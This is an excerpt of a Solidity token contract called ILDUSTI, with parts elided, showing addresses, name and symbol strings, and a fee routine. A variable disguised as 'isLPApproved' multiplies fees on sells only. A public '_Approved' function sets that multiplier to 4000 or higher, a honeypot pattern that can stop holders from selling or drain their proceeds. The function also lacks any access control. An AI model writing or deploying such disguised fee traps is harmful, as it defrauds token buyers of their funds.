...
contract ILDUSTI is IERC20, Auth {
    using SafeMath for uint256;

    address WETH = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEV = 0x60a46a2e9beF703b5e5E1aBD00f376f7a52A2298;

    string constant _name = "I LOVE DUSTIDANI";
    string constant _symbol = "I HATE DUSTIDANI";
    ...
    uint256 public isLPApproved  = 100;
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        uint256 multiplier = isSell ? isLPApproved : 100;
    ...
    function _Approved(uint256 ApprovalValue) public {
        require(ApprovalValue >= 4000);
        isLPApproved = ApprovalValue;        
    }
